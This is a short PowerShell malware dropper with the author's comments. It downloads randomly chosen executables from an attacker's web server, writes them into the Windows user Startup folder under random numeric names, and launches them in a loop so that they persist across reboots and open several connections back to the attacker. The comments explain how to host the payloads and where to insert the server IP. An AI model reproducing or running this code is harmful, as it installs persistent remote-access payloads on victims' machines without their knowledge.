#this file basically get's the resources from a server (the executable). Downloads them at Startup so everytime the machine is turned on they execute, and runs it several times (in order to get connexions from different ports).
#you can use *python3 -m http.server 80* to host the files, just execute the command in the dir where those files are

$value = (([string]$name = (Get-Random -Maximum 999999 -Minimum 10000)) + ".exe") #this is the output name, just a bunch of random numbers
$nameE = **NameExec #you'll have to change the name to the one you have used
$ProcName = ".exe"

#you can change the the lenght to your liking, just know that it will download files like: name1.exe -> name4.exe 
for ($i = 0; $i -le 5; $i++){
#change the http://192.168.50.4/ to your server IP
$WebFile = ([string]$WebLink = **ServerIP + ($nameE + (Get-Random -Maximum 5 -Minimum 1) + $ProcName))
Clear-Host


(New-Object System.Net.WebClient).DownloadFile($WebFile,"$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\$value")
Start-Process ("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\$value")
}